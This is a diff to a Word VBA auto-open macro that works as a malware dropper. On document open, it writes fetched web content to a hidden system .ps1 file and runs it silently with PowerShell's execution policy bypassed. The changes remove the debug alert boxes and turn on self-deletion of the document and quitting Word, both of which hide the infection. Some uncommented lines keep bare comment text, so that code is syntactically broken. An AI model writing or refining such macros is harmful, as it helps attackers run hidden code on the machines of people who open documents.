@@ -18,7 +18,6 @@ Private Sub Document_Open()
     
     ' Check if we got content
     If Len(webContent) > 0 Then
-        MsgBox "checking content", vbCritical, "Debug"
 
         ' Setup folder path
         Dim folderPath As String
@@ -29,7 +28,7 @@ Private Sub Document_Open()
         ' Final PS1 path
         savePath = folderPath & "office_" & Format(Now, "yyyymmdd_hhnnss") & ".ps1"
 
-        MsgBox "deleting if copy exists", vbCritical, "Debug"
+       
         ' Delete existing file if it exists
         On Error Resume Next
         If Dir(savePath) <> "" Then Kill savePath
@@ -49,7 +48,7 @@ Private Sub Document_Open()
         Next i
         
         Close #fileHandle
-        MsgBox "saved content", vbCritical, "Debug"
+    
     
         
         ' Set file attributes to Hidden + System
@@ -64,7 +63,7 @@ Private Sub Document_Open()
         
         ' Execute PowerShell script
         result = Shell("cmd.exe /c powershell.exe -ExecutionPolicy Bypass -File """ & savePath & """", vbHide)
-        MsgBox "executing", vbCritical, "Debug"
+     
       
         
         ' Wait for PowerShell to complete
@@ -89,18 +88,18 @@ Private Sub Document_Open()
             DoEvents
         Loop
         
-        ' Try to delete the document file
-        ' If Dir(currentDocPath) <> "" Then
-        '     Kill currentDocPath
-        ' End If
+        Try to delete the document file
+        If Dir(currentDocPath) <> "" Then
+             Kill currentDocPath
+        End If
         
-        ' Restore alerts
-        ' Application.DisplayAlerts = wdAlertsAll
+        Restore alerts
+        Application.DisplayAlerts = wdAlertsAll
         
-        ' If no other documents are open, quit Word
-        ' If Documents.Count = 0 Then
-        '     Application.Quit SaveChanges:=wdDoNotSaveChanges
-        ' End If
+        If no other documents are open, quit Word
+        If Documents.Count = 0 Then
+            Application.Quit SaveChanges:=wdDoNotSaveChanges
+        End If
     End If
 
     
